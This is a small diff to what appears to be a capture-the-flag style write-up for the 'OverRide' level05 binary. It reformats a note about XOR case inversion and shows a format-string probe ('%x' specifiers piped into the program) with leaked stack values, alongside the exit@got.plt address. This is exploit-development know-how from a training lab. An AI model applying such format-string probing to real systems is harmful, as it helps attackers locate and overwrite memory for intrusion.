@@ -76,7 +76,10 @@ gdb-peda$ x 0x80497e0
   0x80497e0 <exit@got.plt>: 0x08048376
 ```
 
-Input recognizable characters to determine how far away input is layed on the stack. Note that due to XOR operation upercase character will be inverted, A(41) will be a(61).
+Input recognizable characters to determine how far away input is layed on the stack.
+
+> Note that due to XOR operation upercase character will be inverted, A(41) will be a(61).
+
 ```shell
 level05@OverRide:~$ python -c 'print("AAAABBBB" + "%x "*11)' | ./level05
 aaaabbbb00000064 f7fcfac0 f7ec3add ffffd6df ffffd6de 00000000 ffffffff ffffd764 f7fdb000 61616161 62626262
